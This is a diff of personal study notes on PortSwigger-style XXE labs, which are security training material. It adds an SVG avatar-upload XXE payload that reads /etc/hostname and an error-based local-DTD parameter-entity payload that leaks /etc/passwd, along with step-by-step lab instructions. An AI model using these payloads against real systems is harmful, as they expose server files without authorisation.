@@ -287,9 +287,47 @@ This lab lets users attach avatars to comments and uses the Apache Batik library
 To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing.
 
 1. Create a local SVG image with the following content:
-    `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
-    
-2. Post a comment on a blog post, and upload this image as an avatar.
-3. When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.
+    ```
+	<?xml version="1.0" standalone="yes"?>
+	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+	<text font-size="16" x="0" y="16">&xxe;</text>
+	</svg>
+``
+
+
+1. Post a comment on a blog post, and upload this image as an avatar.
+2. When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.
 
 Analysis:
+
+-  we will create and upload a svg file that contains the exploit entity
+- same as traditional xxe: we can declare an entity and view its results via the application response IF NOT we make calls outbound and perform a out of band data exfiltration
+
+nano test.svg  --> insert the desired entity inside of the svg file
+
+	<?xml version="1.0" standalone="yes"?>
+	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+	<text font-size="16" x="0" y="16">&xxe;</text>
+	</svg>
+	
+	![[Pasted image 20240930191646.png]]
+		![[Pasted image 20240930191727.png]]
+
+## **9. Exploiting XXE to retrieve data by repurposing a local DTD**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.
+You'll need to reference an existing DTD file on the server and redefine an entity from it.
+
+1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
+    ```
+    <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
+    <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
+    &#x25;eval; 
+    &#x25;error; '> 
+    %local_dtd; ]>
+    ```
+    
+    This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
